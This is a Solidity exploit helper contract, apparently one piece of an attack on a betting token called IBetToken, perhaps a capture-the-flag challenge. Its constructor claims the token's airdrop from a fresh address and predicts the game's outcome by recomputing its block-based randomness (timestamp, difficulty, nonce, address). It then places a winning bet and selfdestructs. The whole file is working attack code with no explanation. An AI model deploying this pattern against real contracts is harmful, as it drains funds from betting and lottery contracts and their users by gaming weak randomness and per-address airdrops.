// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import "./IBetToken.sol";
import "hardhat/console.sol";
interface IExp {
    function nonce() external returns(uint256);
    function bet() external returns(address);
    function subAddress() external returns(address);
}
contract CAddress{
    constructor(){
        IBetToken bet_ = IBetToken(IExp(msg.sender).bet());
        uint nonce = IExp(msg.sender).nonce();

        if(bet_.balances(address(this)) == 0){
            bet_.airdrop();
        }
        bet_.bet(target(nonce),12);
        selfdestruct(payable(msg.sender));
    }

    function target(uint256 nonce) internal view returns(uint256){
        return uint256(
            keccak256(
                abi.encodePacked(
                    nonce,
                    block.timestamp,
                    block.difficulty,
                    address(this)
                )
            )
        ) % 12;
    }
}